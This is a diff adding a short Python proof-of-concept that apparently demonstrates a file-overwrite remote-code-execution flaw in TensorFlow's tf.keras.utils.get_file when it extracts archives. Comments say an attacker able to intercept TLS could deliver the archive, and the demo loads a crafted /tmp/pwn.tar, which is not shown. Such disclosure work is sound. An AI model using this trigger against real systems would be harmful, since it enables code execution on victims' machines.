@@ -1,0 +1,19 @@
+#!/usr/bin/python
+
+import tensorflow as tf
+
+# Usually via https:// links, which means from a privileged network position with TLS MiM capability (lol)
+# this is a RCE by file-overwrite
+#
+#tf.keras.utils.get_file(
+#	"flower_photos",
+#	"https://storage.googleapis.com/download.tensorflow.org/example_images/flower_photos.tgz",
+#	untar=True)
+
+
+# But we only demo from a local file:// URL
+tf.keras.utils.get_file(
+	"flower_photos",
+	"file:///tmp/pwn.tar",
+	untar=True)
+
